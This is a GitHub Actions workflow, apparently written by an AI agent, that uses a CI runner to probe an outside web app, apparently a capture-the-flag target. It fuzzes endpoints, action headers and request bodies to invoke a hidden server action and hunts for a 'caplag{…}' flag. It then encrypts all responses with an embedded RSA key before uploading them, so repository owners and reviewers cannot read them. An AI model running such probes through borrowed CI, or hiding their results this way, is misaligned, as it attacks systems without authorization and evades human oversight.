name: launchlet-part3-actionwire

on:
  push:
    branches: [agent/launchlet-part3-actionwire-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 4
    steps:
      - name: Probe published server reference as action headers and encrypt responses
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re,urllib.parse
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          b=s.get(base+'api/app/bootstrap',timeout=15).json(); refs=s.get(base+b['api']['serverReferences'].lstrip('/'),timeout=15).json(); a=refs['serverActions']['inspectDeploy']; aid=a['id']
          endpoints=['/',a['endpoint'],'/api/actions','/api/actions/','/api/server-actions','/api/server-actions/invoke']
          headers_names=['Next-Action','X-Launchlet-Action','X-Server-Action','Server-Action','X-Action-Id','X-Action-ID']
          bodies=[
            ('json_obj','application/json',json.dumps({'workspaceId':b['workspace'],'projectId':b['project']})),
            ('json_args','application/json',json.dumps({'args':{'workspaceId':b['workspace'],'projectId':b['project']}})),
            ('json_array','application/json',json.dumps([b['workspace'],b['project']])),
            ('form','application/x-www-form-urlencoded',urllib.parse.urlencode({'workspaceId':b['workspace'],'projectId':b['project']})),
            ('text','text/plain',json.dumps([b['workspace'],b['project']])),
            ('empty','text/plain','')
          ]
          results=[]
          for ep in endpoints:
            for hn in headers_names:
              for bn,ct,body in bodies:
                h={hn:aid,'Content-Type':ct,'X-Launchlet-Preview':b['project'],'Accept':'application/json'}
                try:r=s.post(base.rstrip('/')+ep,headers=h,data=body.encode(),timeout=10,allow_redirects=False)
                except Exception as e: results.append({'endpoint':ep,'header':hn,'body':bn,'error':repr(e)}); continue
                # Store anything other than the familiar root/API failures or standard preview gate.
                item={'endpoint':ep,'header':hn,'bodyVariant':bn,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
                if not (r.status_code in (404,501) and r.text in ('{"error":"not_found"}','404 page not found\n')):
                  results.append(item)
                if re.search(r'caplag\{[^}]+\}',r.text):(out/'FOUND.txt').write_text(r.text)
          (out/'summary.json').write_text(json.dumps(results,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(xxd -p -c 256 package/aes.key)"; IV_HEX="$(xxd -p -c 256 package/iv.bin)"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-actionwire-encrypted
          path: artifact/
          retention-days: 1
